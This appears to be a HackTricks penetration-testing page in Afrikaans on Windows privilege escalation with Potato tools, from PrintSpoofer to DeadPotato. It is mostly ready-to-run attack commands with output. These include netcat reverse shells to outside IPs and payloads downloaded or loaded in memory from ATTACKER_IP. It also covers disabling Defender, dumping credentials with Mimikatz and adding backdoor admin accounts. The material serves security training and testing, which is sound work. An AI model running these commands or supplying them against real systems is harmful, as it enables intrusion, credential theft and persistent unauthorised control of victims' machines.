# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato werk nie** op Windows Server 2019 en Windows 10 build 1809 en later nie. [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** kan egter gebruik word om **dieselfde voorregte te benut en toegang op die `NT AUTHORITY\SYSTEM`**-vlak te verkry. Hierdie [blogplasing](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) bespreek die `PrintSpoofer`-hulpmiddel in diepte. Dit kan gebruik word om nabootsingsvoorregte te misbruik op Windows 10- en Server 2019-gashere waar JuicyPotato nie meer werk nie.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> ’n Moderne alternatief wat in 2024–2025 gereeld bygewerk word, is SigmaPotato (’n fork van GodPotato) wat gebruik van geheue-/.NET-refleksie en uitgebreide OS-ondersteuning byvoeg. Sien vinnige gebruik hieronder en die repo onder References.

Verwante bladsye vir agtergrond en handmatige tegnieke:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Vereistes en algemene slaggate

Al die volgende tegnieke steun op die misbruik van ’n bevoorregte diens wat nabootsing kan uitvoer, vanuit ’n konteks met een van hierdie voorregte:

- SeImpersonatePrivilege (mees algemeen) of SeAssignPrimaryTokenPrivilege
- Hoë integriteit word nie vereis as die token reeds SeImpersonatePrivilege het nie (tipies vir baie diensrekeninge soos IIS AppPool, MSSQL, ens.)

Kontroleer voorregte vinnig:

```cmd
whoami /priv | findstr /i impersonate
```

Operasionele notas:

- As jou shell onder ’n beperkte token loop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sekere kontekste), herstel die rekening se verstekvoorregte met FullPowers en laat loop dan ’n Potato. Voorbeeld: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- ’n Prosestoken kan minder voorregte hê as ’n ander token vir dieselfde diensrekening of aanmeldingsessie. In sommige konfigurasies kan ’n named-pipe-kliënt in dieselfde sessie ’n ander token met SeImpersonatePrivilege blootlê, maar die diens se opgestelde `RequiredPrivileges` en `whoami /priv` beskryf verskillende dinge en bewys nie dat so ’n token beskikbaar is nie. Verifieer die werklike token voordat jy ’n nabootsingsroete oorweeg.
- PrintSpoofer benodig dat die Print Spooler-diens loop en bereikbaar is via die plaaslike RPC-endpoint (spoolss). In geharde omgewings waar Spooler ná PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benodig ’n OXID-resolver wat via TCP/135 bereikbaar is. As uitgaande verkeer geblokkeer word, gebruik ’n redirector/port-forwarder (sien die voorbeeld hieronder). Gaan na watter vlae deur die betrokke build ondersteun word.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op ’n onbekende/nie-ondersteunde RPC-verifikasiediens; probeer ’n ander pipe/transport, of maak seker dat die teikendiens loop.
- “Kitchen-sink”-forks soos DeadPotato sluit ekstra payload-modules (Mimikatz/SharpHound/Defender off) in wat na die skyf skryf; verwag hoër EDR-opsporing as met die liggewig oorspronklikes.

## Vinnige demonstrasie

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notas:
- Jy kan -i gebruik om ’n interaktiewe proses in die huidige konsole te begin, of -c om ’n eenreël-opdrag uit te voer.
- Vereis die Spooler-diens. As dit gedeaktiveer is, sal dit misluk.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

In die [upstream gebruik](https://github.com/antonioCoco/RoguePotato#usage), verskaf `-e` die command, kies `-l` die local resolver port, en kies die opsionele `-c` ’n CLSID. As COM activation ’n service begin waarvan die executable path reeds gewysig is, kan daardie service sy veranderde command uitvoer onafhanklik van token impersonation; ondersoek die service configuration voordat jy waargenome SYSTEM execution aan hierdie technique toeskryf.

As outbound 135 geblokkeer is, pivot die OXID resolver via socat op jou redirector:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato is ’n nuwer COM-misbruikprimitief wat laat in 2022 vrygestel is en die **PrintNotify**-diens teiken in plaas van Spooler/BITS. Die binêre lêer instansieer die PrintNotify COM-bediener, vervang ’n fake `IUnknown` en aktiveer dan ’n bevoorregte terugroeping via `CreatePointerMoniker`. Wanneer die PrintNotify-diens (wat as **SYSTEM** loop) terugkoppel, dupliseer die proses die teruggekreeë token en begin die aangegewe payload met volle voorregte.<sup>[[13]](#references)</sup>

Belangrike operasionele notas:

* Werk op Windows 10/11 en Windows Server 2012–2022, solank die Print Workflow/PrintNotify-diens geïnstalleer is (dit is teenwoordig selfs wanneer die verouderde Spooler ná PrintNightmare gedeaktiveer is).
* Vereis dat die oproepende konteks **SeImpersonatePrivilege** het (tipies vir IIS APPPOOL-, MSSQL- en geskeduleerde-taakdiensrekeninge).
* Aanvaar óf ’n direkte opdrag óf ’n interaktiewe modus, sodat jy in die oorspronklike konsole kan bly. Voorbeeld:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Omdat dit uitsluitlik COM-gebaseer is, is geen named-pipe listeners of eksterne redirectors nodig nie, wat dit ’n direkte plaasvervanger maak op hosts waar Defender RoguePotato se RPC-binding blokkeer.

Operateurs soos Ink Dragon vuur PrintNotifyPotato onmiddellik af nadat hulle ViewState RCE op SharePoint verkry het, om van die `w3wp.exe`-worker na SYSTEM te pivot voordat hulle ShadowPad installeer.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Wenk: As een pipe misluk of EDR dit blokkeer, probeer die ander ondersteunde pipes:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Notas:
- Werk op Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege teenwoordig is.
- Kry die binary wat by die geïnstalleerde runtime pas (bv. `GodPotato-NET4.exe` op moderne Server 2022).
- As jou aanvanklike uitvoeringsprimitief ’n webshell/UI met kort time-outs is, plaas die payload as ’n script en vra GodPotato om dit uit te voer in plaas van ’n lang inline-opdrag.<sup>[[12]](#references)</sup>

Vinnige staging-patroon vanaf ’n skryfbare IIS-webroot:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bied twee variante wat diens-DCOM-objekte teiken wat by verstek RPC_C_IMP_LEVEL_IMPERSONATE gebruik. Bou of gebruik die verskafde binaries en voer jou opdrag uit:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (opgedateerde GodPotato-fork)

SigmaPotato voeg moderne geriefies by, soos uitvoering in die geheue via .NET-refleksie en ’n PowerShell-helper vir ’n omgekeerde shell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Bykomende voordele in 2024–2025-bouweergawes (v1.2.x):
- Ingeboude reverse shell-vlag `--revshell` en verwydering van die 1024-karakterlimiet vir PowerShell, sodat jy lang AMSI-omseil-payloads in een slag kan uitvoer.
- Reflection-vriendelike sintaksis (`[SigmaPotato]::Main()`), plus ’n rudimentêre AV-ontduikingstruuk via `VirtualAllocExNuma()` om eenvoudige heuristieke te fnuik.
- Afsonderlike `SigmaPotatoCore.exe`, saamgestel teen .NET 2.0 vir PowerShell Core-omgewings.

### DeadPotato (2024 GodPotato-herwerking met modules)

DeadPotato behou die GodPotato OXID/DCOM-impersonasieketting, maar sluit post-exploitation-hulpmiddels in sodat operateurs onmiddellik SYSTEM-regte kan verkry en persistence/insameling kan uitvoer sonder bykomende gereedskap.<sup>[[15]](#references)</sup>

Algemene modules (almal vereis SeImpersonatePrivilege):

- `-cmd "<cmd>"` — begin ’n arbitrêre opdrag as SYSTEM.
- `-rev <ip:port>` — vinnige reverse shell.
- `-newadmin user:pass` — skep ’n plaaslike admin vir persistence.
- `-mimi sam|lsa|all` — laat Mimikatz neersit en loop om geloofsbriewe te dump (skryf na skyf, opvallend).
- `-sharphound` — voer SharpHound-insameling as SYSTEM uit.
- `-defender off` — skakel Defender se intydse beskerming af (baie opvallend).

Voorbeeld-eenreël-opdragte:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Omdat dit ekstra binaries saamlewer, verwag meer AV/EDR-vlae; gebruik die ligter GodPotato/SigmaPotato wanneer stealth belangrik is.

## References

- [1] [PrintSpoofer – Misbruik van nabootsingsvoorregte op Windows 10 en Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Geen JuicyPotato meer nie? Ou storie, verwelkom RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Herstel verstek-tokenvoorregte vir diensrekeninge](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM-leak → NTFS-junction na webroot-RCE → FullPowers + GodPotato na SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice-makro → IIS-webshell → GodPotato na SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Binne Ink Dragon: Onthulling van die relay-netwerk en innerlike werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Herbewerking van GodPotato met ingeboude post-ex-modules](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
